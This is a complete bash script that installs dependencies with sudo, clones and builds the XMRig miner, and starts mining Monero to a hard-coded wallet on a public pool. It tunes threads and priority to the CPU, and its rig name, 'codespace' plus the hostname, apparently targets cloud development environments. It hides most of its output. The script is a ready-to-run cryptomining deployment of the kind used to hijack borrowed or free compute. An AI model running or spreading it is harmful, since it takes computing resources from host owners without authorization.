#!/bin/bash
set -e
# Detect CPU architecture
ARCH=$(uname -m)
CPU_CORES=$(nproc)
# Detect if likely mobile (ARM-based, e.g., Android Termux or Raspberry Pi)
if [[ "$ARCH" == "aarch64" || "$ARCH" == "armv7l" || "$ARCH" == "armv8l" ]]; then
    IS_MOBILE=true
    echo "Detected mobile/ARM device. Optimizing for efficiency (lower threads, priority)."
    MAX_THREADS_HINT=50 # Use 50% of cores on mobile to avoid overheating/battery drain
    PRIORITY=0 # Lower priority on mobile
    YIELD=true # Yield CPU on mobile for better responsiveness
else
    IS_MOBILE=false
    echo "Detected desktop/server (x86_64). Optimizing for maximum performance."
    MAX_THREADS_HINT=100 # Use full capacity on PC
    PRIORITY=5 # Higher priority on PC
    YIELD=false # No yield on PC
fi
RIG_NAME="codespace-$(hostname)-$(date +%s)"
sudo apt update -y > /dev/null 2>&1
sudo apt install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev > /dev/null 2>&1
cd ~
[ ! -d "xmrig" ] && git clone https://github.com/xmrig/xmrig.git > /dev/null 2>&1
cd xmrig
mkdir -p build && cd build
# Build flags: Disable unnecessary features for mobile
CMAKE_FLAGS="-DWITH_HWLOC=ON -DWITH_CN_GHOUL=OFF -DWITH_OPENCL=OFF -DWITH_CUDA=OFF -DCMAKE_BUILD_TYPE=Release"
if [ "$IS_MOBILE" = true ]; then
    CMAKE_FLAGS="$CMAKE_FLAGS -DWITH_ASM=OFF" # Disable ASM on ARM for stability
fi
cmake .. $CMAKE_FLAGS > /dev/null
make -j$CPU_CORES > /dev/null
WALLET="42X98aXKvRm1H5CuJFMJP4XNvXPMLephkdF6yebtkJdja1UfnUKz2eaMqpNG2j81p9cVHubpQNuxHXSiFTPL85Jp8ByFcAY"
# Generate config.json with dynamic settings
cat > config.json <<EOL
{
  "autosave": true,
  "background": false,
  "colors": true,
  "randomx": {
    "init": -1,
    "mode": "fast",
    "numa": $IS_MOBILE,
    "scratchpad_prefetch_mode": 1
  },
  "cpu": {
    "enabled": true,
    "hw-aes": null,
    "priority": $PRIORITY,
    "memory-pool": true,
    "max-threads-hint": $MAX_THREADS_HINT,
    "affinity": -1,
    "asm": $IS_MOBILE,
    "argon2-impl": "auto",
    "yield": $YIELD
  },
  "opencl": { "enabled": false },
  "cuda": { "enabled": false },
  "donate-level": 1,
  "log-file": "xmrig.log",
  "pools": [
    {
      "algo": "rx/0",
      "coin": "monero",
      "url": "pool.hashvault.pro:443",
      "user": "$WALLET",
      "pass": "$RIG_NAME",
      "rig-id": null,
      "nicehash": false,
      "keepalive": true,
      "enabled": true,
      "tls": true,
      "tls-fingerprint": "420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14"
    }
  ],
  "print-time": 10,
  "retries": 5,
  "retry-pause": 1,
  "user-agent": "XMRig-$( [ "$IS_MOBILE" = true ] && echo "Mobile" || echo "Desktop" )-$ARCH/$CPU_CORES-core",
  "watch": false
}
EOL
# Adjust process priority and I/O based on device
if [ "$IS_MOBILE" = true ]; then
    # On mobile: lower priority, no ionice (may not be available)
    sudo renice -n $PRIORITY -p $$ 2>/dev/null || true
else
    # On PC: high priority, low I/O nice
    sudo renice -n -$PRIORITY -p $$ 2>/dev/null || true
    sudo ionice -c 1 -p $$ 2>/dev/null || true
fi
sleep 2
./xmrig -c config.json
